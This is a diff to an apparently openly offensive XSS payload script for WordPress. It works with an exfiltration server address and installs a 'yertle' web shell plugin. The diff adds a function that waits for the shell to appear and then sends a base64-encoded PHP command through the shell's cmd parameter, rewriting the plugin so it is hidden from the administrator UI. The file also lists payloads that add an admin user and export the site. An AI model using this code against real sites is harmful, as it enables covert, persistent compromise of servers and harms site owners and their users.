@@ -25,6 +25,14 @@
 var httpExfilServer = "http://192.168.78.135:8888"
 
 
+
+const sleep = (milliseconds) => 
+{
+	return new Promise(resolve => setTimeout(resolve, milliseconds))
+}
+
+
+
 function read_body(xhr) { 
 	var data;
 
@@ -283,7 +291,7 @@ function installYertleShell()
 			}
 			uploadXhr.send(new Blob([aBody]));
 
-			console.log("Done adding malicious plugin");
+			console.log("Done uploading malicious plugin");
 			// This is fun, you don't actually have to activate the yertle plugin
 			// to use it. 
 			// You can now use the yertle script to interact with the server by 
@@ -291,6 +299,7 @@ function installYertleShell()
 			// what's in the zip file embedded in this javascript example
 			// See WPForce:
 			// https://github.com/n00py/WPForce
+
 			// Note that I had a misspelling in here before. Thankfully
 			// Scott White noticed it, and informed me of my error. 
 			// Not through a pull request, no. Shit-posting, yes. 
@@ -301,6 +310,52 @@ function installYertleShell()
 }
 
 
+
+// Would be nice to make another version for hiding 
+// arbitrary plugins, assuming you add the plugin code. 
+async function hideYertleShell()
+{
+	// So this cmd in base64 is a php call to overwrite the
+	// shell.php file with the same code, just without the comments
+	// that hold the wordpress plugin details that wordpress
+	// scrapes to fill in the plugin menu entry. This effectively
+	// hides the plugin in the administrator UI, although the 
+	// files are still plainly viewable on the filesystem if
+	// anyone goes looking. 
+	var uri = "/wp-content/plugins/shell/shell.php?cmd=cGhwIC1yICdlY2hvIGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFLSUNBZ0lDUmpiMjF0WVc1a0lEMGdK%0ARjlIUlZSYkltTnRaQ0pkT3dvZ0lDQWdKR052YlcxaGJtUWdQU0J6ZFdKemRISW8KSkdOdmJXMWhi%0AbVFzSURBc0lDMHhLVHNLSUNBZ0lDUmpiMjF0WVc1a0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNna1ky%0AOXRiV0Z1WkNrNwpDZ29nSUNBZ2FXWWdLR05zWVhOelgyVjRhWE4wY3lnblVtVm1iR1ZqZEdsdmJr%0AWjFibU4wYVc5dUp5a3BJSHNLSUNBZ0lDQWdJQ1JtCmRXNWpkR2x2YmlBOUlHNWxkeUJTWldac1pX%0ATjBhVzl1Um5WdVkzUnBiMjRvSjNONWMzUmxiU2NwT3dvZ0lDQWdJQ0FnSkhSb2FXNW4KZVNBOUlD%0AUm1kVzVqZEdsdmJpMCthVzUyYjJ0bEtDUmpiMjF0WVc1a0lDazdDZ29nSUNBZ2ZTQmxiSE5sYVdZ%0AZ0tHWjFibU4wYVc5dQpYMlY0YVhOMGN5Z25ZMkZzYkY5MWMyVnlYMloxYm1OZllYSnlZWGtuS1Nr%0AZ2V3b2dJQ0FnSUNBZ1kyRnNiRjkxYzJWeVgyWjFibU5mCllYSnlZWGtvSjNONWMzUmxiU2NzSUdG%0AeWNtRjVLQ1JqYjIxdFlXNWtLU2s3Q2dvZ0lDQWdmU0JsYkhObGFXWWdLR1oxYm1OMGFXOXUKWDJW%0ANGFYTjBjeWduWTJGc2JGOTFjMlZ5WDJaMWJtTW5LU2tnZXdvZ0lDQWdJQ0FnWTJGc2JGOTFjMlZ5%0AWDJaMWJtTW9KM041YzNSbApiU2NzSUNSamIyMXRZVzVrS1RzS0NpQWdJQ0I5SUdWc2MyVWdld29n%0ASUNBZ0lDQWdjM2x6ZEdWdEtDUmpiMjF0WVc1a0tUc0tJQ0FnCklIMEtDaUFnSUNBL1Bnb2dJQ0Fn%0ACiIpOycgPiBzaGVsbC5waHA%3D%0A";
+	
+	var testUri = "/wp-content/plugins/shell/shell.php";
+
+	// First we need to make sure the wordpress
+	// server has finished installing the yertle plugin
+	// since this function needs the shell in order
+	// to overwrite itself
+	while (true)
+	{
+		var xhr = new XMLHttpRequest();
+		xhr.open('GET', testUri, false);  
+		xhr.send(null);
+
+		if (xhr.status == 200) 
+		{
+  			console.log("!! Our shell is ready!");
+  			break;
+		}
+		if (xhr.status == 404)
+		{
+			console.log("Shell is still 404'ing...");
+			await sleep(5000);
+			continue;
+		}
+
+	}
+
+	console.log("About to overwrite the shell.php to hide it in the UI...");
+	xhr = new XMLHttpRequest();
+	
+	xhr.open("GET", uri, true);
+	xhr.send(null);
+}
 
 
 
@@ -314,7 +369,28 @@ function installYertleShell()
 */
 
 // Uncomment the function you want to run on the XSS pop
+
+
+
+// The user, password, permissions and such are defined in the function 
+// itself, make sure you adjust these values. 
 //getNonceAndAddUser();
+
+
+
+
+// This is stupid, I don't know why I implemented it. 
 //exportWordPressSite();
+
+
+
+
+// Install a yertle shell (see: https://github.com/n00py/WPForce)
 //installYertleShell();
+
+
+
+
+// Hide the yertle shell plugin from the UI
+//hideYertleShell();
 
